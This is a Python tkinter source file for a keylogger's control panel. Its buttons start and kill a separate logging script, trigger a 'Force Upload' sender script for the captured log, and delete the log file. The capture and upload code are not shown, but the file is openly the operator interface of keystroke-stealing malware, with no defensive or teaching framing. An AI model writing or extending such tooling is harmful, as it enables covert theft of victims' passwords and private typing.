import tkinter as tk
import time
import os
import subprocess
from tkinter.font import Font
import keyboard

status="OFF"
# Create the main window
root = tk.Tk()
root.title("Keylogger")
root.geometry("250x110+100+50")
root.resizable(False, False)
#set window color
root['background']='#ffd97d'
# Create a function that will be called when the "Turn On" button is clicked



def turn_Keylogger_on():
    # Update the Label to show that Keylogger is turned on
    status_label.config(bg="#a5ffd6" ,font=allfont , text="STATUS: ON")
    status="ON"
    global process
    process = subprocess.Popen(['python', 'Keylogger\main.pyw'])
    #root.withdraw()


# Create a function that will be called when the "Turn Off" button is clicked
def turn_Keylogger_off():
    # Update the Label to show that Keylogger is turned off
    status_label.config(bg="#ee6055", text="STATUS: OFF", font=allfont)
    status_label.place()
    global process
    os.kill(process.pid, 9)
    send_data()
    status="OFF"

def send_data():
    send_process = subprocess.Popen(['python', 'Keylogger\sender.pyw'])

def delete_log():
    os.remove("Keylogger/logs/log.txt")

allfont=Font(family="Gotham", size=10, weight="bold")
# Create a "Turn On" button
turn_on_button = tk.Button(root, bg="#a5ffd6", text="Start Logging", font=allfont, command=turn_Keylogger_on)
# Create a "Turn Off" button
turn_off_button = tk.Button(root, bg='#ee6055',  text="Stop Logging",font=allfont, command=turn_Keylogger_off)

send_data_button= tk.Button(root, bg='#ff9914',  text="Force Upload",font=allfont, command=send_data)

del_button=tk.Button(root, bg='#ff9914',  text="  Delete Log  ",font=allfont, command=delete_log)

# Create a Label to show the current state
status_label = tk.Button(bg="#ee6055", text="STATUS: OFF", font=allfont)
# Pack the buttons and the Label into the main window
turn_on_button.pack(side=tk.TOP, anchor=tk.NW, pady=5, padx=5)
turn_off_button.pack(side=tk.TOP, anchor=tk.NW, pady=5, padx=5)

del_button.pack(pady=5, padx=5)
del_button.place(x=130, y=5)

send_data_button.pack(side=tk.TOP, anchor=tk.SE)
send_data_button.place(x=130, y= 40)

status_label.pack(side=tk.TOP, anchor=tk.N, pady=5, padx=5)



# Run the main loop
root.mainloop()

#To hide the default root window you can use

#root.withdraw()
#and to make it visible again you can use

#root.deiconify()
